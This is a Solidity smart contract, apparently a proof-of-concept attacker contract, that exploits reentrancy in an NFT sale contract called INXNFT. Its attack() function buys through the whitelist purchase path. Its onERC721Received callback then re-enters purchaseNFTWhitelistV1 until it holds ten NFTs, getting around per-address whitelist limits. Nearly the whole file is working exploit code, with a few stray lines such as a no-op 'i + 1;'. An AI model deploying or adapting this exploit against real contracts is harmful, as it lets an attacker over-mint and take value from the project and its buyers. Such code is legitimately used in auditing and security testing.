// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyINXNFT {
    address nftContractAddress;
    address tokenAddress;
    bytes32[] merkleProof1;
    uint i = 0;

    constructor(address _erc20TokenAddress, address _nftContract) {
        tokenAddress = _erc20TokenAddress;
        nftContractAddress = _nftContract;
    }

    function attack(
        uint256 quantity,
        bytes32[] calldata merkleProof
    ) public payable {
        uint256 price = IINXNFT(nftContractAddress).price();
        merkleProof1 = merkleProof;
        require(
            IERC20(tokenAddress).transferFrom(
                msg.sender,
                address(this),
                price * 2
            ),
            "ERC20 transfer failed"
        );
        require(
            IERC20(tokenAddress).approve(
                nftContractAddress,
                IINXNFT(nftContractAddress).price() * quantity
            ),
            "ERC20 approval failed"
        );
        IINXNFT(nftContractAddress).purchaseNFTWhitelistV1(
            quantity,
            merkleProof
        );
    }

    // function onERC721Received(
    //     address,
    //     address,
    //     uint256,
    //     bytes memory
    // ) public returns (bytes4) {
    //     if (nftContract.totalSupply() < nftContract.maxSupply()) {
    //         nftContract.purchaseNFTVbyETH{value: nftContract.etherprice()}(1);
    //     }
    //     return this.onERC721Received.selector;
    // }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (IINXNFT(nftContractAddress).balanceOf(address(this)) < 10) {
            // IINXNFT(nftContractAddress).purchaseNFTWhitelistV1(1, merkleProof1);
            i + 1;

            IINXNFT(nftContractAddress).purchaseNFTWhitelistV1(1, merkleProof1);
        }
        return this.onERC721Received.selector;
    }
}

interface IINXNFT {
    function setMerkleRoot(bytes32 _merkleRoot) external;

    function balanceOf(address from) external view returns (uint);

    function transferFrom(address from, address to, uint256 tokenId) external;

    function startPublicSale() external;

    function stopPublicSale() external;

    function mintReserve(uint256 quantity) external;

    function purchaseNFTV1(uint256 quantity) external;

    function purchaseNFTVbyETH(uint256 quantity) external payable;

    function purchaseNFT(uint256 quantity) external;

    function purchaseNFTWhitelist(
        uint256 quantity,
        bytes32[] calldata merkleProof
    ) external;

    function purchaseNFTWhitelistV1(
        uint256 quantity,
        bytes32[] calldata merkleProof
    ) external;

    function hashLeaf() external view returns (bytes32);

    function addToWhitelist(
        address[] calldata addresses,
        uint256[] calldata purchaseLimits
    ) external;

    function removeFromWhitelist(address[] calldata addresses) external;

    function purchaseNFTWhitelist(uint256 quantity) external;

    // Optional: Functions to retrieve data from the contract
    function token() external view returns (address);

    function price() external view returns (uint256);

    function whitelistPrice() external view returns (uint256);

    function maxSupply() external view returns (uint256);

    function whitelistMaxPurchase() external view returns (uint256);

    function merkleRoot() external view returns (bytes32);

    function whitelistMinted(address) external view returns (uint256);

    function publicSaleOpen() external view returns (bool);

    function totalSupply() external view returns (uint256);

    function etherprice() external view returns (uint256);
}
